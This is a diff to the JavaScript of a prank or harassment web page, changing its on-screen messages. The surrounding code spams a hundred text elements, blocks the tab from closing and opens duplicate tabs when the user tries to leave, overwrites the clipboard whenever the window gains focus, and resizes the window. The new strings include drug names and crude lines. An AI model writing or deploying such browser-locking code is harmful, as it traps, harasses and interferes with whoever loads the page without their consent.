@@ -80,7 +80,7 @@
         const noise = createNoise();
 
         // Spam text on screen
-        const messages = ["WE DONT WELCOME YOU HERE", "YOU ARE UNWELCOME", "LEAVE"];
+        const messages = ["eyedope druggy", "leave the room","methamphetamine","heroin","cocaine","weed","I LOVE FEMBOYS!", "gagahgahgah", "do you expect us to let you here?", "REAL GAMERS ONLY!!!!!!!!!!", "KODAK BLACK OUR KING!", "KAnye West is 100% SANE!", "+vouch hamburger"];
         function spamText() {
             for (let i = 0; i < 100; i++) { // Create 100 spam elements
                 const div = document.createElement('div');
@@ -162,7 +162,7 @@
         // Prevent closing the tab
         window.addEventListener('beforeunload', (e) => {
             e.preventDefault();
-            e.returnValue = 'Are you sure you want to leave? You are unwelcome here!';
+            e.returnValue = 'e';
             // Open more tabs on attempt to close
             duplicateTabs();
         });
@@ -194,7 +194,7 @@
 
         // Manipulate clipboard on focus
         window.addEventListener('focus', () => {
-            navigator.clipboard.writeText('YOU ARE UNWELCOME').catch(() => {});
+            navigator.clipboard.writeText('hi im snapple my ingredients consist of watermelon and lemonade. ').catch(() => {});
         });
 
         // Randomly resize window if possible (may not work in all browsers)
